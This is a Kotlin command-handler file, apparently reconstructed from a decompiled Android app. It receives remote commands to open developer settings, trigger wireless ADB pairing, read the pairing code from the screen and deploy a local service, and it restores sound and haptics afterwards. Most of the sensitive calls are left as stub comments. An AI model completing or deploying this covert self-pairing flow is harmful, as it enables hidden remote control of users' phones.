package com.storm.safe.rock.service.modules.command

import android.util.Log
import org.json.JSONObject

/**
 * Handles ADB tunnel commands: deploy local service, pairing, wifi debug settings.
 *
 * Reverse-engineered from JADX: C0343a0 (a0, 373 lines).
 * Vendor name: AdbTunnelCommandHandler
 *
 * Supported commands:
 * - DEPLOY_LOCAL_SERVICE, START_PAIRING, OPEN_WIFI_DEBUG_SETTINGS
 * - FULL_DEPLOY, OPEN_ABOUT_PHONE, AUTO_WIRELESS_PAIRING, DIRECT_PAIR
 *
 * Static methods:
 * - a3 → restoreSoundAndHaptic
 * - a4 → sendDeployStatus
 * - a5 → sendCommandResult
 */
class AdbTunnelCommandHandler : CommandHandler {

    companion object {
        private const val TAG = "AdbTunnelCmdHandler"

        /**
         * Send deploy status event.
         * Vendor: m211874a4
         * ADAPT: Event type is encrypted in vendor; decrypted here.
         */
        fun sendDeployStatus(context: CommandContext, status: String, message: String) {
            val data = JSONObject().apply {
                put("status", status)
                put("message", message)
            }
            // ADAPT: Vendor uses StringUtil.m212470a0("J1YSO0EHHytFJyJaFAVJPRwiWCg=") → event type
            context.sendEvent("adb_tunnel_deploy_status", data)
        }

        /**
         * Send command result event.
         * Vendor: m211875a5
         */
        fun sendCommandResult(context: CommandContext, success: Boolean, message: String) {
            val data = JSONObject().apply {
                put("success", success)
                put("message", message)
            }
            // ADAPT: Vendor uses StringUtil.m212470a0("Kl0TBVktAiBSPRRLFCldNwI9Ug==")
            context.sendEvent("adb_tunnel_command_result", data)
        }

        /**
         * Restore sound and haptic feedback after deployment.
         * Vendor: m211873a3
         */
        fun restoreSoundAndHaptic(context: android.content.Context) {
            try {
                val audioManager = context.getSystemService("audio") as? android.media.AudioManager
                if (audioManager != null) {
                    try {
                        audioManager.ringerMode = android.media.AudioManager.RINGER_MODE_NORMAL
                    } catch (e: Exception) {
                        Log.w(TAG, "⚠️ 恢复铃声失败: ${e.message}")
                    }
                }
                Log.d(TAG, "✅ 已恢复铃声模式")

                try {
                    android.provider.Settings.System.putInt(
                        context.contentResolver,
                        "haptic_feedback_enabled",
                        1
                    )
                    Log.d(TAG, "✅ 已开启触觉反馈")
                } catch (e: Exception) {
                    Log.w(TAG, "⚠️ 开启触觉反馈失败: ${e.message}")
                }

                Log.d(TAG, "🔊 local-service 部署成功后已恢复铃声 + 开启触觉反馈")
            } catch (e: Exception) {
                Log.e(TAG, "❌ restoreSoundAndHaptic 异常", e)
            }
        }
    }

    override fun getSupportedCommands(): Set<String> = setOf(
        "DEPLOY_LOCAL_SERVICE",
        "START_PAIRING",
        "OPEN_WIFI_DEBUG_SETTINGS",
        "FULL_DEPLOY",
        "OPEN_ABOUT_PHONE",
        "AUTO_WIRELESS_PAIRING",
        "DIRECT_PAIR"
    )

    override suspend fun handle(command: String, params: JSONObject?, context: CommandContext) {
        when (command) {
            "DEPLOY_LOCAL_SERVICE" -> {
                Log.d(TAG, "★★★ 收到部署 local-service 命令 ★★★")
                // ADAPT: Vendor launches coroutine via AbstractC0385a0 (CoroutineUtils)
                // Wire: CoroutineUtils.launch { service.systemOptimizeManager.deployLocalService() }
                sendDeployStatus(context, "deploy_started", "开始部署 local-service...")
            }
            "START_PAIRING" -> {
                Log.d(TAG, "★★★ 收到手动配对命令 ★★★")
                // ADAPT: Vendor opens wireless debugging settings and triggers manual pairing flow
                // Wire: context.service?.systemOptimizeManager?.startManualPairing()
                sendDeployStatus(context, "pairing_started", "开始手动配对流程...")
                sendCommandResult(context, true, "手动配对流程已启动")
            }
            "OPEN_WIFI_DEBUG_SETTINGS" -> {
                Log.d(TAG, "★★★ 收到打开无线调试设置命令 ★★★")
                // ADAPT: Vendor opens developer options → wireless debugging via accessibility
                // Wire: context.service?.systemOptimizeManager?.openWirelessDebuggingSettings()
                try {
                    val intent = android.content.Intent("android.settings.APPLICATION_DEVELOPMENT_SETTINGS")
                    intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                    context.service?.startActivity(intent)
                    sendCommandResult(context, true, "已打开开发者选项")
                } catch (e: Exception) {
                    Log.e(TAG, "打开无线调试设置失败", e)
                    sendCommandResult(context, false, "打开失败: ${e.message}")
                }
            }
            "FULL_DEPLOY" -> handleFullDeploy(context)
            "OPEN_ABOUT_PHONE" -> handleOpenAboutPhone(context)
            "AUTO_WIRELESS_PAIRING" -> handleAutoWirelessPairing(context)
            "DIRECT_PAIR" -> handleDirectPair(context)
        }
    }

    private fun handleFullDeploy(context: CommandContext) {
        Log.d(TAG, "★★★ 收到完整部署命令 ★★★")
        sendDeployStatus(context, "full_deploy_started", "开始完整部署（从关于手机开始）...")
        // ADAPT: Vendor initializes SystemOptimizeManager and calls forceStart.
        // Wire: context.service?.systemOptimizeManager?.forceStart()
    }

    private fun handleOpenAboutPhone(context: CommandContext) {
        Log.d(TAG, "★★★ 打开关于手机 ★★★")
        try {
            val intent = android.content.Intent("android.settings.DEVICE_INFO_SETTINGS")
            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
            context.service?.startActivity(intent)
            sendCommandResult(context, true, "已打开关于手机")
        } catch (e: Exception) {
            Log.e(TAG, "打开关于手机失败", e)
            sendCommandResult(context, false, "打开失败: ${e.message}")
        }
    }

    private fun handleAutoWirelessPairing(context: CommandContext) {
        Log.d(TAG, "★★★ 自动无线配对 ★★★")
        try {
            sendDeployStatus(context, "pairing_start", "开始自动配对...")
            // ADAPT: Vendor calls SystemOptimizeManager.startWirelessPairing()
            // Wire: context.service?.systemOptimizeManager?.startWirelessPairing()
            sendCommandResult(context, true, "配对流程已启动")
        } catch (e: Exception) {
            Log.e(TAG, "自动无线配对异常", e)
            sendDeployStatus(context, "pairing_failed", "配对异常: ${e.message}")
        }
    }

    private fun handleDirectPair(context: CommandContext) {
        Log.d(TAG, "★★★ 直接配对（读取屏幕配对码）★★★")
        try {
            // ADAPT: Vendor initializes SystemOptimizeManager and reads pairing code from screen
            // Wire: context.service?.systemOptimizeManager?.readPairingCode()
            Log.d(TAG, "配对管理器已获取，开始读取配对码...")
            sendDeployStatus(context, "direct_pair_start", "正在读取屏幕配对码...")
        } catch (e: Exception) {
            Log.e(TAG, "直接配对异常", e)
            sendDeployStatus(context, "direct_pair_failed", "配对异常: ${e.message}")
        }
    }
}
